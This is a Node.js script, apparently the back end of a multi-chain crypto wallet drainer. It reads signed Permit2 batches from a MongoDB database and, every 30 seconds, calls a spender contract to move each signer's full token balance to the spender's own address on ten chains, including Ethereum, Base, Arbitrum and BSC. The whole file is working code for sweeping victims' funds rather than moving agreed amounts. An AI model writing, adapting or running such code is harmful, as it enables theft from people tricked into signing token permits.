require('dotenv').config();
const { MongoClient } = require('mongodb');
const { ethers } = require('ethers');

// Chain ID to network configuration

const networkConfig = {
  1: { //mainnet
    rpcUrl: process.env.MAINNET_URL,
    spenderAddress: process.env.MAINNET_SPENDER
  },
  8453: { //base
    rpcUrl: process.env.BASE_URL,
    spenderAddress: process.env.BASE_SPENDER
  },
  42161: { //arbitrum
    rpcUrl: process.env.ARBITRUM_URL,
    spenderAddress: process.env.ARBITRUM_SPENDER
  },
  56: { //bsc
    rpcUrl: process.env.BNB_URL,
    spenderAddress: process.env.BNB_SPENDER
  },
  10: { //optimism
    rpcUrl: process.env.OPTIMISM_URL,
    spenderAddress: process.env.OPTIMISM_SPENDER
  },
  7777777: { //zora
    rpcUrl: process.env.ZORA_URL,
    spenderAddress: process.env.ZORA_SPENDER
  },
  43114: { //avalanche
    rpcUrl: process.env.AVALANCHE_URL,
    spenderAddress: process.env.AVALANCHE_SPENDER
  },
  137: { //polygon
    rpcUrl: process.env.POLYGON_URL,
    spenderAddress: process.env.POLYGON_SPENDER
  },
  324: { //zksync
    rpcUrl: process.env.ZKSYNC_URL,
    spenderAddress: process.env.ZKSYNC_SPENDER
  },
  81457: { //BLAST
    rpcUrl: process.env.BLAST_URL,
    spenderAddress: process.env.BLAST_SPENDER
  }

}

const MONGO_URI = process.env.MONGO_URI;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const client = new MongoClient(MONGO_URI);

async function transferTokens() {
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const permitsCollection = db.collection('permits');

    const permits = await permitsCollection.find({ submitted: true, executed: { $ne: true } }).toArray();
    if (permits.length === 0) {
      console.log('No submitted permits found to transfer');
      return;
    }

    const currentTimestamp = Math.floor(Date.now() / 1000);

    for (const permitData of permits) {
      const { owner, permitBatch, chainId } = permitData;

      if (!chainId || !networkConfig[chainId]) {
        console.log(`Unsupported chainId ${chainId} for owner: ${owner}`);
        continue;
      }

      const { rpcUrl, spenderAddress } = networkConfig[chainId];
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

      const erc20Abi = ['function balanceOf(address owner) view returns (uint256)'];
      const spenderAbi = ['function transferTokens(address from, address to, uint160 amount, address token)'];
      const spenderContract = new ethers.Contract(spenderAddress, spenderAbi, wallet);

      console.log(`Processing transfers for owner: ${owner} on chainId: ${chainId}`);
      console.log('PermitBatch:', JSON.stringify(permitBatch, null, 2));

      const validTokens = permitBatch.details.filter(detail => currentTimestamp <= detail.expiration);
      if (validTokens.length === 0) {
        console.log('All token permits have expired');
        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { executed: true, executedAt: new Date(), reason: 'All permits expired' } }
        );
        continue;
      }

      let allTransfersSuccessful = true;

      for (const detail of validTokens) {
        try {
          const tokenContract = new ethers.Contract(detail.token, erc20Abi, provider);
          const balance = await tokenContract.balanceOf(owner);
          const maxUint160 = ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
          const amount = balance.gt(maxUint160) ? maxUint160 : balance;

          if (amount.isZero()) {
            console.log(`No balance to transfer for ${detail.token}`);
            continue;
          }

          console.log(`Transferring ${amount.toHexString()} of ${detail.token}`);
          const transferTx = await spenderContract.transferTokens(
            owner,
            spenderAddress, // Send to the spender contract (update if different recipient needed)
            amount,
            detail.token,
            { gasLimit: 600000 }
          );
          const receipt = await transferTx.wait();
          console.log(`Transfer completed for ${detail.token}: ${transferTx.hash}`);
        } catch (transferError) {
          console.error(`Transfer failed for ${detail.token}:`, transferError);
          allTransfersSuccessful = false;
          continue;
        }
      }

      if (allTransfersSuccessful) {
        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { executed: true, executedAt: new Date() } }
        );
        console.log(`Transfers marked as executed for owner: ${owner}`);
      }
    }
  } catch (error) {
    console.error('Transfer failed:', error);
  } finally {
    await client.close();
  }
}

async function runContinuously() {
  console.log('Starting continuous transfer service...');
  
  while (true) {
    try {
      await transferTokens();
    } catch (error) {
      console.error('Error in transfer cycle:', error);
    }
    
    console.log('Waiting 30 seconds before next check...');
    await new Promise(resolve => setTimeout(resolve, 30000));
  }
}

runContinuously().catch((error) => {
  console.error('Service failed:', error);
  process.exit(1);
});